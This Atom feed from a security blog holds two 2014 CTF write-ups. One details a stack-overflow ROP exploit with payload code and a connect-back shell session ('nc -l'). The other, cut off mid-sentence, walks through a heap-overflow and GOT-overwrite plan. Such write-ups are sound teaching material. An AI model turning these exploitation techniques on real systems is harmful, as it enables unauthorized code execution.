<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>Code Arcana - security</title><link href="http://codearcana.com/" rel="alternate"></link><link href="http://codearcana.com/feeds/security.atom.xml" rel="self"></link><id>http://codearcana.com/</id><updated>2014-01-19T00:00:00-08:00</updated><entry><title>Ghost in the Shellcode 2014 - fuzzy</title><link href="http://codearcana.com/posts/2014/01/19/ghost-in-the-shellcode-2014-fuzzy.html" rel="alternate"></link><published>2014-01-19T00:00:00-08:00</published><updated>2014-01-19T00:00:00-08:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2014-01-19:/posts/2014/01/19/ghost-in-the-shellcode-2014-fuzzy.html</id><summary type="html">&lt;p&gt;tl;dr - &lt;code&gt;fuzzy&lt;/code&gt; is a "super secure parsing engine", that includes a histogram function. The histogram ascii text uses a buffer on the stack, but will increment
buckets past the end of the buffer if non ascii text is provided, allowing us to
rop. Binary and exploit available &lt;a
href="http://ppp.cylab.cmu.edu/wordpress/wp-content/uploads/2014/01/fuzzy.tar.gz"&gt;here&lt;/a&gt;.
Cross …&lt;/p&gt;</summary><content type="html">&lt;p&gt;tl;dr - &lt;code&gt;fuzzy&lt;/code&gt; is a "super secure parsing engine", that includes a histogram function. The histogram ascii text uses a buffer on the stack, but will increment
buckets past the end of the buffer if non ascii text is provided, allowing us to
rop. Binary and exploit available &lt;a
href="http://ppp.cylab.cmu.edu/wordpress/wp-content/uploads/2014/01/fuzzy.tar.gz"&gt;here&lt;/a&gt;.
Cross post from &lt;a href="http://ppp.cylab.cmu.edu/wordpress/?p=1146"&gt;PPP
blog&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;The program&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;fuzzy&lt;/code&gt; is a "super secure parsing engine", that includes a histogram function:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; nc fuzzy.2014.ghostintheshellcode.com 4141
&lt;span class="go"&gt;Welcome to the super secure parsing engine!&lt;/span&gt;
&lt;span class="go"&gt;Please select a parser!&lt;/span&gt;

&lt;span class="go"&gt;1) Sentence histogram&lt;/span&gt;
&lt;span class="go"&gt;2) Sorted characters (ascending)&lt;/span&gt;
&lt;span class="go"&gt;3) Sorted characters (decending)&lt;/span&gt;
&lt;span class="go"&gt;4) Sorted ints (ascending)&lt;/span&gt;
&lt;span class="go"&gt;5) Sorted ints (decending&lt;/span&gt;
&lt;span class="go"&gt;6) global_find numbers in string&lt;/span&gt;
&lt;span class="go"&gt;1&lt;/span&gt;
&lt;span class="go"&gt;Enter a series of characters&lt;/span&gt;
&lt;span class="go"&gt;hello&lt;/span&gt;
&lt;span class="go"&gt; :0 !:0 &amp;quot;:0 #:0 $:0 &lt;/span&gt;
&lt;span class="gp"&gt;%&lt;/span&gt;:0 &lt;span class="p"&gt;&amp;amp;&lt;/span&gt;:0 &lt;span class="err"&gt;&amp;#39;&lt;/span&gt;:0 &lt;span class="o"&gt;(&lt;/span&gt;:0 &lt;span class="o"&gt;)&lt;/span&gt;:0 
&lt;span class="go"&gt;... &amp;lt;snip&amp;gt; ...&lt;/span&gt;
&lt;span class="go"&gt;a:0 b:0 c:0 d:0 e:1 &lt;/span&gt;
&lt;span class="go"&gt;f:0 g:0 h:1 i:0 j:0 &lt;/span&gt;
&lt;span class="go"&gt;k:0 l:2 m:0 n:0 o:1 &lt;/span&gt;
&lt;span class="go"&gt;p:0 q:0 r:0 s:0 t:0 &lt;/span&gt;
&lt;span class="go"&gt;u:0 v:0 w:0 x:0 y:0 &lt;/span&gt;
&lt;span class="go"&gt;z:0 {:0 |:0 }:0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;As you can see, it computes a histogram of the input. This histogram
is constructed using a buffer that is on the stack, so if we send it
non-ascii text we can write to the stack. By modifying the saved &lt;code&gt;ebp&lt;/code&gt;,
we can point the stack to a buffer we control. &lt;/p&gt;
&lt;p&gt;Unfortunately, this is a bit challenging to figure out because all 
the interesting functions are encrypted. Fortunately for us, the "encryption"
is just bitwise not. Using our favorite hex editor, we make a new binary with 
the decrypted functions to reverse.&lt;/p&gt;
&lt;p&gt;With control of the stack, we get control over rip and can ROP.
We will use the &lt;code&gt;callFunction&lt;/code&gt; function, which decrypts a function
into an executable page and then runs it. Our goal will be to &lt;code&gt;read&lt;/code&gt; encrypted shellcode
into a known location (there is a convenient buffer &lt;code&gt;dontcollide&lt;/code&gt; in the data
section that is never used), then invoke &lt;code&gt;callFunction&lt;/code&gt; to run our shellcode. 
Unfortunately, since this is x64, we need to find a good gadget to be able to
control registers and call functions. Luckily, there is a good gadget in 
&lt;code&gt;__libc_csu_init&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;loc_401790:&lt;/span&gt;                             &lt;span class="c1"&gt;; CODE XREF: __libc_csu_init+64j&lt;/span&gt;
                &lt;span class="nf"&gt;mov&lt;/span&gt;     &lt;span class="nb"&gt;rdx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;r13&lt;/span&gt;
                &lt;span class="nf"&gt;mov&lt;/span&gt;     &lt;span class="nb"&gt;rsi&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;r14&lt;/span&gt;
                &lt;span class="nf"&gt;mov&lt;/span&gt;     &lt;span class="nb"&gt;edi&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;r15d&lt;/span&gt;
                &lt;span class="nf"&gt;call&lt;/span&gt;    &lt;span class="kt"&gt;qword&lt;/span&gt; &lt;span class="nv"&gt;ptr&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;r12&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nb"&gt;rbx&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
                &lt;span class="nf"&gt;add&lt;/span&gt;     &lt;span class="nb"&gt;rbx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
                &lt;span class="nf"&gt;cmp&lt;/span&gt;     &lt;span class="nb"&gt;rbx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;rbp&lt;/span&gt;
                &lt;span class="nf"&gt;jnz&lt;/span&gt;     &lt;span class="nv"&gt;short&lt;/span&gt; &lt;span class="nv"&gt;loc_401790&lt;/span&gt;

&lt;span class="nl"&gt;loc_4017A6:&lt;/span&gt;                             &lt;span class="c1"&gt;; CODE XREF: __libc_csu_init+4Aj&lt;/span&gt;
                &lt;span class="nf"&gt;mov&lt;/span&gt;     &lt;span class="nb"&gt;rbx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;rsp&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
                &lt;span class="nf"&gt;mov&lt;/span&gt;     &lt;span class="nb"&gt;rbp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;rsp&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mh"&gt;10h&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
                &lt;span class="nf"&gt;mov&lt;/span&gt;     &lt;span class="nv"&gt;r12&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;rsp&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mh"&gt;18h&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
                &lt;span class="nf"&gt;mov&lt;/span&gt;     &lt;span class="nv"&gt;r13&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;rsp&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mh"&gt;20h&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
                &lt;span class="nf"&gt;mov&lt;/span&gt;     &lt;span class="nv"&gt;r14&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;rsp&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mh"&gt;28h&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
                &lt;span class="nf"&gt;mov&lt;/span&gt;     &lt;span class="nv"&gt;r15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;rsp&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mh"&gt;30h&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
                &lt;span class="nf"&gt;add&lt;/span&gt;     &lt;span class="nb"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;38h&lt;/span&gt;
                &lt;span class="nf"&gt;retn&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This gadget allows us to control the first three  registers we need an call 
anything we have function pointer to. The program uses a large function pointer table to enable
the encrypted functions to call library functions, so we have pointers to many
library functions. Unfortunately, we do &lt;em&gt;not&lt;/em&gt; have a pointer to &lt;code&gt;readAll&lt;/code&gt;, so we
cannot use it with our gadget. Furthermore, our gadget only controls 3 arguments,
so we cannot easily use &lt;code&gt;recv&lt;/code&gt;. Lastly, we cannot use the encrypted &lt;code&gt;my_readAll&lt;/code&gt;
function (that we have a pointer to) because it reads its arguments out of a
buffer and we don't have an easy way to call functions with a buffer we control 
as an argument. Still, this gadget allows us to chain calls arbitrary function pointers
with 3 arguments:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# Assumes rip points to loc_4017A6.&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;call&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;function_ptr&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;arg0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;arg1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;arg2&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
  &lt;span class="c1"&gt;# Make sure rbx is 0 to make math easy, and rbp is 1 so we fall through to&lt;/span&gt;
  &lt;span class="c1"&gt;# loc_4017A6 for repeated calls.&lt;/span&gt;
  &lt;span class="c1"&gt;#      padding            rbx       rbp       r12                  r13=rdx      r14=rsi      r15=edi&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0xdeadbeef&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;function_ptr&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;arg2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;arg1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;arg0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;__libc_csu_init_gadget&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Instead, we make a function pointer to &lt;code&gt;readAll&lt;/code&gt; in the data section that we can use our
gadget.
We call &lt;code&gt;memset&lt;/code&gt; 4 times, once for each distinct byte in
the the address of &lt;code&gt;readAll&lt;/code&gt;, and make &lt;code&gt;dontcollide&lt;/code&gt; a pointer to &lt;code&gt;readAll&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# Set dontcollide to be a function pointer to readAll (0x4013cb).&lt;/span&gt;
&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;call&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;memset_fptr&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dontcollide&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;call&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;memset_fptr&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dontcollide&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0xcb&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;call&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;memset_fptr&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dontcollide&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x13&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;call&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;memset_fptr&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dontcollide&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x40&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We then can use our gadget to call &lt;code&gt;readAll&lt;/code&gt;, 
reading the encrypted shellcode into &lt;code&gt;dontcollide&lt;/code&gt;, and then again to call
&lt;code&gt;callFunction&lt;/code&gt;, executing our shellcode. &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# Read the shellcode into a buffer. The socket to read from is 4.&lt;/span&gt;
&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;call&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dontcollide&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dontcollide&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x400&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="c1"&gt;# Call our shellcode.&lt;/span&gt;
&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;call&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;callEncryptedFunction_fptr&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dontcollide&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We grab some connect back shellcode 
and get a shell:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;~% python fuzzy.py                                           [console 1]&lt;/span&gt;
&lt;span class="go"&gt;~% nc -l 16705                                               [console 2]&lt;/span&gt;
&lt;span class="go"&gt;cat key.txt&lt;/span&gt;
&lt;span class="go"&gt;key is: fuzzingIsFun2&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;</content><category term="ctf"></category><category term="exploitation"></category></entry><entry><title>Ghost in the Shellcode 2014 - gitsmsg</title><link href="http://codearcana.com/posts/2014/01/19/ghost-in-the-shellcode-2014-gitsmsg.html" rel="alternate"></link><published>2014-01-19T00:00:00-08:00</published><updated>2014-01-19T00:00:00-08:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2014-01-19:/posts/2014/01/19/ghost-in-the-shellcode-2014-gitsmsg.html</id><summary type="html">&lt;p&gt;&lt;em&gt;tl;dr&lt;/em&gt; - &lt;code&gt;gitsmsg&lt;/code&gt; is a messaging server. A heap overflow led to arbitrary read / write and eventual code exec 
after circumventing RELRO. Binary and exploit available &lt;a
href="http://ppp.cylab.cmu.edu/wordpress/wp-content/uploads/2014/01/gitsmsg.tar.gz"&gt;here&lt;/a&gt;. Cross post from 
&lt;a href="http://ppp.cylab.cmu.edu/wordpress/?p=1152"&gt;PPP blog&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;The program&lt;/h2&gt;
&lt;p&gt;First, we reverse engineered much of the binary. 
You "login" as a user, then can compose …&lt;/p&gt;</summary><content type="html">&lt;p&gt;&lt;em&gt;tl;dr&lt;/em&gt; - &lt;code&gt;gitsmsg&lt;/code&gt; is a messaging server. A heap overflow led to arbitrary read / write and eventual code exec 
after circumventing RELRO. Binary and exploit available &lt;a
href="http://ppp.cylab.cmu.edu/wordpress/wp-content/uploads/2014/01/gitsmsg.tar.gz"&gt;here&lt;/a&gt;. Cross post from 
&lt;a href="http://ppp.cylab.cmu.edu/wordpress/?p=1152"&gt;PPP blog&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;The program&lt;/h2&gt;
&lt;p&gt;First, we reverse engineered much of the binary. 
You "login" as a user, then can compose messages to other users. The messages
were saved to a linked list and could be edited before being serialized to disk.
Each message is a tagged union of &lt;code&gt;{byte,dword,double}{_,array}&lt;/code&gt;
or &lt;code&gt;string&lt;/code&gt;. A &lt;code&gt;string&lt;/code&gt; indexed into an array of static strings.
A "typical" usage might be:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# After connection, appropriate functions hide the binary protocol.&lt;/span&gt;
&lt;span class="n"&gt;login&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;alex&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;newmessage&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;to&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;andrew&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;msg_type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;DWORD_ARRAY&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;count&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;17&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;newmassage&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;to&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;max&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;msg_type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;STRING&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;count&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;edit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msgid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;offset&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;14&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;delete&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msgid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;save&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;disconnect&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;The vulnerability&lt;/h2&gt;
&lt;p&gt;In short, when initializing one of the message type, the programmer forgot to
factor the data type width when calculating the message size:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="nl"&gt;DOUBLE_ARRAY&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
  &lt;span class="n"&gt;size&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;count&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="n"&gt;size&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;count&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="n"&gt;v3&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;count&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mh"&gt;0x3FF&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="n"&gt;v4&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;count&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;1023&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="n"&gt;v0&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;count&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;count&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;v3&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="n"&gt;v4&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;goto&lt;/span&gt; &lt;span class="n"&gt;LABEL_9&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;malloc&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This eventually gives us a heap overwrite:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;readAll&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;size&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;At this point, it seems relatively straightforward. We will allocate 2 messages,
leaving the heap in this state:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;| message A | data A | message B |
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We then free the first message:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;| &amp;lt;free&amp;gt; | &amp;lt;free&amp;gt; | message B |
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And allocate a new message of type &lt;code&gt;DOUBLE_ARRAY&lt;/code&gt;, allowing us to overwrite and
modify the second message:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;| message C | data C ... essage B |
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Our goal will be to overwrite a GOT entry and give us a shell. Since the program
is PIE, we have to leak an address first. We do this by editing the second
message which does 2 things for us: it allows us to put it back into a valid
state, and it will put a address from the &lt;code&gt;.data&lt;/code&gt; segment into the heap (if a 
&lt;code&gt;string&lt;/code&gt; message is edited, it will update the message data pointer to point
to the correct string in the &lt;code&gt;.data&lt;/code&gt; segment). &lt;/p&gt;
&lt;p&gt;Actually, at this point we have an arbitrary read and an arbitrary write
primitive. Since the data for the first message overlaps with the type and 
pointer of the second message, we can edit the first message to change the type
of the second. If we change the type of the second message to &lt;code&gt;dword&lt;/code&gt; and its
